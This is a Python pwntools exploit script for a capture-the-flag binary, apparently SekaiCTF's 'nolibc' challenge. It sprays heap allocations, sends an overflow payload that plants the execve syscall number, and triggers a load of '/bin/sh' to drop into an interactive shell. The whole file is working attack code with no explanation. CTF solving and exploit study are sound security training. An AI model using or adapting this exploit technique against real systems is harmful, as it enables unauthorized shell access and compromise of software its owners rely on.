#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from lianpwn import *
from pwncli import *

io = process("./main")
# io = remote("nolibc.chals.sekai.team", 1337, ssl=True)
elf = ELF("./main", checksec=False)

context.log_level = "debug"
context.arch = "amd64"
context.terminal = ["tmux", "sp", "-h", "-l", "140"]


def ru(a, drop=False):
    return io.recvuntil(a, drop)


rl = lambda a=False: io.recvline(a)
rn = lambda x: io.recvn(x)
s = lambda x: io.send(x)
sl = lambda x: io.sendline(x)
sa = lambda a, b: io.sendafter(a, b)
sla = lambda a, b: io.sendlineafter(a, b)
ia = lambda: io.interactive()
dbg = lambda text=None: gdb.attach(io, text)
i2b = lambda c: str(c).encode()
u32_ex = lambda data: u32(data.ljust(4, b"\x00"))
u64_ex = lambda data: u64(data.ljust(8, b"\x00"))


def cmd_1(choice):
    ru(b"Choose an option: ")
    sl(i2b(choice))


def register(name, passwd):
    cmd_1(2)
    ru(b"Username: ")
    sl(name)
    ru(b"Password: ")
    sl(passwd)


def login(name, passwd):
    cmd_1(1)
    ru(b"Username: ")
    sl(name)
    ru(b"Password: ")
    sl(passwd)


register(b"eastXueLian", b"NailEuxTsae")
login(b"eastXueLian", b"NailEuxTsae")


def cmd(choice):
    ru(b"Choose an option: ")
    sl(i2b(choice))


def add(size, data):
    cmd(1)
    ru(b"Enter string length: ")
    sl(i2b(size))
    ru(b"Enter a string: ")
    if len(data) < size + 1:
        sl(data)
    else:
        s(data)


def delet(idx):
    cmd(2)
    ru(b"Enter the index of the string to delete: ")
    sl(i2b(idx))


def show():
    cmd(3)


def save(name):
    cmd(4)
    ru(b"Enter the filename: ")
    sl(name)


def load(name):
    cmd(5)
    ru(b"Enter the filename: ")
    sl(name)


for _ in range(0xAA):
    add(0x100, b"a")

add(0x3F, b"a" * 0x30 + p64(0x100000000) + p8(0x3B))

for i in range(0xA0):
    delet(i)

load(b"/bin/sh\x00")
ia()
